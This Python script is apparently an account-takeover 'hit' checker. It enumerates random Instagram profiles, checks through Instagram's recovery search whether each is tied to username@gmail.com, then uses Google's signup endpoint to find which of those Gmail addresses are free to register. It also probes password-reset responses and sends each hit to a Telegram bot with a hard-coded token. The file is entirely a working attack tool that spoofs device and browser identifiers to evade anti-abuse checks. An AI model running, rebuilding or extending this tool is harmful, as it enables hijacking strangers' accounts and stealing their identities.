import sys
import os
import time
import random
import json
import re
from typing_extensions import Literal
import requests
import threading
import uuid
import secrets
import base64
import httpx
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

THREADS = 150
MIN_FOLLOWERS = 0

hits = 0
good = 0
bad = 0
bad_email = 0
checked = 0
start_time = time.time()
hit_counter = 0
lock = threading.Lock()
current_username = "waiting..."
status_message = "Starting..."

WHITE = '\x1b[97m'
BRIGHT_WHITE = '\x1b[1;97m'
RESET = '\x1b[0m'


class GoogleChecker:
    def __init__(self):
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        threading.Thread(target=self._refresh_token, daemon=True).start()

    def _generate_ua(self):
        try:
            return generate_user_agent()
        except:
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

    def _refresh_token(self):
        while True:
            try:
                n1 = ''.join(random.choice(self.yy) for _ in range(random.randrange(6, 9)))
                n2 = ''.join(random.choice(self.yy) for _ in range(random.randrange(3, 9)))
                host = ''.join(random.choice(self.yy) for _ in range(random.randrange(15, 30)))

                headers = {
                    "accept": "*/*",
                    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                    "google-accounts-xsrf": "1",
                    "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Windows"',
                    "user-agent": self._generate_ua(),
                }

                res1 = requests.get(
                    'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                    headers=headers,
                    timeout=15
                )
                tok = re.search(
                    r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                    res1.text
                )
                if tok:
                    tl = tok.group(2)
                    cookies = {'__Host-GAPS': host}
                    headers2 = {
                        'authority': 'accounts.google.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                        'google-accounts-xsrf': '1',
                        'origin': 'https://accounts.google.com',
                        'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                        'user-agent': self._generate_ua(),
                    }
                    data = {
                        'f.req': f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                        'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    }
                    response = requests.post(
                        'https://accounts.google.com/_/signup/validatepersonaldetails',
                        cookies=cookies,
                        headers=headers2,
                        data=data,
                        timeout=15
                    )
                    if '",null,"' in response.text:
                        tl = response.text.split('",null,"')[1].split('"')[0]
                    host = response.cookies.get('__Host-GAPS', host)
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(8, 20))
                    continue
            except:
                pass

            try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'origin': 'https://accounts.google.com',
                    'referer': 'https://accounts.google.com/',
                    'user-agent': self._generate_ua(),
                    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
                    'x-same-domain': '1',
                    'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                params = {
                    'rpcids': 'NHJMOd',
                    'source-path': '/lifecycle/steps/signup/username',
                    'hl': 'en'
                }
                fake_email = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890.', k=random.randint(16, 26)))
                data = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{fake_email}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D'
                response = requests.post(
                    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                    params=params, headers=headers, data=data, timeout=15
                )
                tl_match = re.search(r'"TL:([^"]+)"', response.text)
                if tl_match:
                    tl = tl_match.group(1)
                    host = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(15, 30)))
                    with open('tl.txt', 'w') as f:
                        f.write(tl + '//' + host + '\n')
                    time.sleep(random.uniform(8, 20))
                    continue
            except:
                pass

            time.sleep(random.uniform(3, 10))

    def check_availability(self, email):
        if '@' in email:
            email = email.split('@')[0]

        try:
            with open('tl.txt', 'r') as f:
                line = f.read().strip()
                if not line:
                    raise Exception("Empty tl")
                tl, host = line.split('//')
        except:
            time.sleep(2)
            try:
                with open('tl.txt', 'r') as f:
                    line = f.read().strip()
                    tl, host = line.split('//')
            except:
                return 'bad'

        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': f'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
            'user-agent': self._generate_ua(),
        }
        params = {'TL': tl}
        data = (
            f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
            f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
            f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
            f'&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888'
            f'&cookiesDisabled=false'
            f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
            f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        )

        try:
            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=10
            )
            if '"gf.uar",1' in response.text:
                return 'good'
            elif '"er",null,null,null,null,400' in response.text:
                time.sleep(1)
                return self.check_availability(email)
            else:
                return 'bad'
        except:
            return 'bad'


class InstagramChecker:
    def __init__(self):
        self.session = requests.Session()
        self.csrf = None
        self.lsd = None
        self.doc_id = "26672929172408668"
        self.lock = threading.Lock()

    def _ensure_tokens(self):
        with self.lock:
            if self.csrf and self.lsd:
                return True
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = self.session.get('https://www.instagram.com/', headers=headers, timeout=20)
            if response.status_code == 200:
                csrf = response.cookies.get('csrftoken', '')
                match = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', response.text)
                lsd = match.group(1) if match else None
                if csrf and lsd:
                    with self.lock:
                        self.csrf = csrf
                        self.lsd = lsd
                    return True
        except:
            pass
        return False

    def check_email(self, email):
        url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
        device = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        family = str(uuid.uuid4())
        android = "android-" + ''.join(random.choices('abcdef0123456789', k=16))
        waterfall = str(uuid.uuid4())

        payload = {
            'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ waterfall +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
            'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
        }
        headers = {
            'User-Agent': "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            'accept-language': "en-IN, en-US",
            'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
            'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            'x-ig-android-id': android,
            'x-ig-app-id': "567067343352427",
            'x-ig-app-locale': "en_IN",
            'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
            'x-ig-device-id': device,
            'x-ig-family-device-id': family,
            'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
            'x-pigeon-rawclienttime': str(time.time()),
            'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
            'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
        }
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=20)
            return f"{email}" in resp.text
        except:
            return False

    def get_user_data(self, user_id):
        if not self._ensure_tokens():
            return None
        url = "https://www.instagram.com/api/graphql"
        headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': self.lsd,
            'x-csrftoken': self.csrf,
            'x-fb-friendly-name': 'PolarisProfilePageContentQuery',
            'x-asbd-id': '359341',
            'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'priority': 'u=1,i',
        }
        cookies = {'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'}
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            'lsd': self.lsd,
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'PolarisProfilePageContentQuery',
            'variables': json.dumps(variables),
            'server_timestamps': 'true',
            'doc_id': self.doc_id,
        }
        try:
            response = self.session.post(url, headers=headers, data=payload, cookies=cookies, timeout=20)
            if response.status_code == 200:
                data = response.json()
                user = data.get('data', {}).get('user')
                if user and user.get('username'):
                    return user
        except:
            pass
        return None


class ReportManager:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.log_file = "mayu_errors.log"
        self._telegram_working = True

    def _send_telegram_with_retry(self, msg, retries=3, delay=2):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
        session = requests.Session()
        for attempt in range(retries):
            try:
                r = session.post(url, json=payload, timeout=15)
                if r.status_code == 200:
                    return True
                time.sleep(delay * (attempt + 1))
            except:
                time.sleep(delay * (attempt + 1))
        return False

    def send_telegram(self, msg):
        if not self._telegram_working:
            return False
        success = self._send_telegram_with_retry(msg)
        if not success:
            self._telegram_working = False
        return success

    def save_to_file(self, msg, filename='mayuxgmailhits.txt'):
        clean_msg = re.sub(r'\x1b\[[0-9;]*m', '', msg)
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(f'{clean_msg}\n\n{"="*50}\n\n')

    def format_result(self, data):
        global hit_counter
        with lock:
            hit_counter += 1
        username = data.get('username', '')
        full_name = data.get('full_name', '')
        followers = data.get('follower_count') or 0
        following = data.get('following_count') or 0
        posts = data.get('media_count') or 0
        email = data.get('email', f"{username}@gmail.com")
        bio = data.get('biography', '')
        pk = data.get('pk', '')
        is_private = data.get('is_private', False)

        try:
            pk_int = int(pk)
            year_ranges = [
                (1, 5000000, 2010), (5000001, 17750000, 2011),
                (17750001, 279760000, 2012), (279760001, 900990000, 2013),
                (900990001, 1629010000, 2014), (1629010001, 2369359761, 2015),
                (2369359762, 4239516754, 2016), (4239516755, 6345108209, 2017),
                (6345108210, 10016232395, 2018), (10016232396, 27238602159, 2019),
                (27238602160, 43464475395, 2020), (43464475395, 50289297647, 2021),
                (50289297647, 57464707082, 2022), (57464707082, 63313426938, 2023),
                (63313426938, 70134323896, 2024), (70313426938, 78313496938, 2025)
            ]
            year = '2023+'
            for low, high, y in year_ranges:
                if low <= pk_int <= high:
                    year = str(y)
                    break
        except:
            year = 'Unknown'

        reset_mask = self._fetch_reset_email(username)
        moni_status = 'No'
        if not is_private and posts >= 3 and bio and len(bio) > 10:
            personal_words = ['my', 'i', 'me', 'life', 'vlog', 'daily', 'family', 'love']
            if any(word in bio.lower() for word in personal_words):
                moni_status = 'Yes'
            elif posts >= 5:
                moni_status = 'Yes'

        msg = f"""
ᴛᴏᴏʟ ʙʏ - jk
━━━━━━━━━━━━━━━━━━
🪪  𝐈ᴅ          {pk}
👤  𝐀ᴄᴄᴏᴜɴᴛ     @{username}
📧  𝐄ᴍᴀɪʟ       {email}

📊  𝐒ᴛᴀᴛs
• 𝐅ᴏʟʟᴏᴡᴇʀs   {followers}
• 𝐅ᴏʟʟᴏᴡɪɴɢ   {following}
• 𝐏ᴏsᴛs      {posts}
• 𝐁ɪᴏ        {bio[:40] if bio else 'NO BIO'}

• 𝐂ʀᴇᴀᴛᴇᴅ    {year}

🌐  𝐏ʀᴏғɪʟᴇ     instagram.com/{username}
━━━━━━━━━━━━━━━━━━
"""
        return msg

    def _fetch_reset_email(self, username):
        try:
            headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            }
            client = httpx.Client(http2=True, headers=headers, timeout=10)
            r = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username}
            )
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "ok":
                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
            return "-"
        except:
            return "-"


def display_stats():
    global hits, good, bad, bad_email, checked, current_username, status_message
    elapsed = int(time.time() - start_time)
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    total = good + bad
    rate = int((hits / total * 100)) if total > 0 else 0

    stats = (
        f'\033[H\033[J'
        f'{BRIGHT_WHITE}ᴛᴏᴏʟ ʙʏ - jk{RESET}\n'
        f'{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}\n'
        f'{BRIGHT_WHITE}𝐓ᴏᴛᴀʟ 𝐇ɪᴛꜱ     : {WHITE}{hits:04d}{RESET}\n'
        f'{BRIGHT_WHITE}𝐆ᴏᴏᴅ 𝐈ɢ        : {WHITE}{good:04d}{RESET}\n'
        f'{BRIGHT_WHITE}𝐁ᴀᴅ 𝐄ᴍᴀɪʟ      : {WHITE}{bad_email:04d}{RESET}\n'
        f'{BRIGHT_WHITE}𝐁ᴀᴅ 𝐈ɢ         : {WHITE}{bad:04d}{RESET}\n'
        f'{BRIGHT_WHITE}𝐂ʜᴇᴄᴋᴇᴅ       : {WHITE}{checked:06d}{RESET}\n'
        f'{BRIGHT_WHITE}𝐇ɪᴛ 𝐑ᴀᴛᴇ       : {WHITE}{rate}%{RESET}\n'
        f'{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}\n'
        f'{BRIGHT_WHITE}⏱ 𝐔ᴘᴛɪᴍᴇ    : {WHITE}{hours:02d}h {minutes:02d}m {seconds:02d}s{RESET}\n'
        f'{BRIGHT_WHITE}👤 𝐂ᴜʀʀᴇɴᴛ    : {WHITE}{current_username[:30]}{RESET}\n'
        f'{BRIGHT_WHITE}📡 𝐒ᴛᴀᴛᴜs     : {WHITE}{status_message[:30]}{RESET}\n'
        f'{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}'
    )
    sys.stdout.write(stats)
    sys.stdout.flush()


def process_user(google, insta, reporter):
    global hits, good, bad, bad_email, checked, current_username, status_message
    while True:
        try:
            user_id = random.randint(2500000000, 21254029834)
            user_data = insta.get_user_data(user_id)
            if not user_data:
                with lock:
                    status_message = "Fetching profile..."
                time.sleep(random.uniform(0.05, 0.15))
                continue

            username = user_data.get('username')
            if not username:
                continue

            follower_count = user_data.get('follower_count') or 0
            if follower_count < MIN_FOLLOWERS:
                with lock:
                    bad += 1
                    checked += 1
                display_stats()
                time.sleep(random.uniform(0.05, 0.1))
                continue

            with lock:
                current_username = f"@{username}"
                status_message = "Checking IG email..."

            email = f"{username}@gmail.com"

            if insta.check_email(email):
                with lock:
                    good += 1
                    status_message = "Google check..."
                display_stats()

                if google.check_availability(email) == 'good':
                    with lock:
                        hits += 1
                        status_message = "HIT FOUND!"
                    display_stats()

                    profile = {
                        'username': username,
                        'email': email,
                        'full_name': user_data.get('full_name', ''),
                        'follower_count': user_data.get('follower_count') or 0,
                        'following_count': user_data.get('following_count') or 0,
                        'media_count': user_data.get('media_count') or 0,
                        'is_private': user_data.get('is_private', False),
                        'biography': user_data.get('biography', ''),
                        'pk': user_data.get('pk', ''),
                    }
                    msg = reporter.format_result(profile)
                    print(f"\n{WHITE}{'='*50}{RESET}")
                    print(msg)
                    print(f"{WHITE}{'='*50}{RESET}\n")
                    reporter.save_to_file(msg)
                    reporter.send_telegram(msg)
                else:
                    with lock:
                        bad_email += 1
                        status_message = "Bad Google..."
                display_stats()
            else:
                with lock:
                    bad += 1
                    status_message = "Bad IG..."
                display_stats()

            with lock:
                checked += 1

            time.sleep(random.uniform(0.02, 0.08))

        except Exception:
            time.sleep(random.uniform(0.1, 0.3))
            continue


# ---- DEFAULTS ----
DEFAULT_CHAT_ID   = "8281412626"
DEFAULT_BOT_TOKEN = "8722068236:AAH6OK2ZqfD2zPhsTjBNNVtx2xpDsp8-oVI"


def main():
    global status_message
    os.system('cls' if os.name == 'nt' else 'clear')

    print(f"{BRIGHT_WHITE}ᴛᴏᴏʟ ʙʏ - JK{RESET}")
    print(f"{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    # Use saved values directly - no input prompts
    chat_id   = DEFAULT_CHAT_ID
    bot_token = DEFAULT_BOT_TOKEN

    print(f"{BRIGHT_WHITE}[+] Chat ID   : {chat_id}{RESET}")
    print(f"{BRIGHT_WHITE}[+] Bot Token : {bot_token[:10]}...{RESET}")
    print(f"{WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")

    google = GoogleChecker()
    insta = InstagramChecker()
    reporter = ReportManager(bot_token, chat_id)

    status_message = "Tool started - Waiting for data..."

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(process_user, google, insta, reporter)

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{BRIGHT_WHITE}[!] Session ended by user{RESET}")
            sys.exit(0)

if __name__ == "__main__":
     main()
